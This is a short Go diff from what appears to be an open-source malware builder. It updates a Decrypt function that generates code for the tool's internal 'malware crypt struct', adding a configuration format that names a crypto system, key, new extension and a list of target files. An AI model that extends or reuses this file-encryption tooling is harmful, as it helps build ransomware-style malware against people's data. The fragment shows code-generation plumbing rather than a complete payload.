@@ -7,12 +7,18 @@ import (
 )
 
 // Decrypts the provided target
-// The input can follow this format '${"<crypto system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
+// The input can follow this format '${"<crypto system>", "<key>", "<new extension>" , "target_1", "target_2", ... "target_N"}$'
 // following the above format will "overwrite" all values in the struct before decrypting
+// The struct meaning the internal malware crypt struct
 func Decrypt(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-
+	call_history := []string{}
 	system_call := "decrypt"
+
+	if value != "" {
+		call_history, s_json = preface_configuration(value, s_json)
+		data_object = structure.Receive(s_json) // Update our structure
+	}
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", system_call),
@@ -84,5 +90,7 @@ func Decrypt(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("crypto/rand")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
+	call_history = append(call_history, fmt.Sprintf("%s()", system_call))
+
+	return call_history, structure.Send(data_object)
 }
